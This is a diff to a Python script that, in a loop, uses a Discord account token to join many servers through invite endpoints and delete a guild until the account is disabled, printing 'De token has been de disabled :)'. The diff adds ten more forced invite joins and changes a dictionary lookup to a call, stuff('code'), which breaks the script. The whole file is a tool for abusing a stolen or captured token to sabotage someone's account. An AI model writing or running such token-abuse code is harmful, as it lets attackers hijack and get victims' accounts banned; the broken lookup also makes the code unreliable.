@@ -18,8 +18,18 @@ while True:
     check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
     stuff = check.json()
     requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/codm", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/anime", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/growtopia", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/incognito", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/aliucord", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/5toubun", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/tonikawa", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/dragonmaid", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/disney", headers={"Authorization": token})
+    requests.post("https://discordapp.com/api/v6/invite/powerkuyofficial", headers={"Authorization": token})
     requests.delete("https://discordapp.com/api/v6/guilds" + data['guild']['id'], headers={"Authorization": token})
 
-    if stuff['code'] == 0:
+    if stuff('code') == 0:
         print("De token has been de disabled :)")
         break
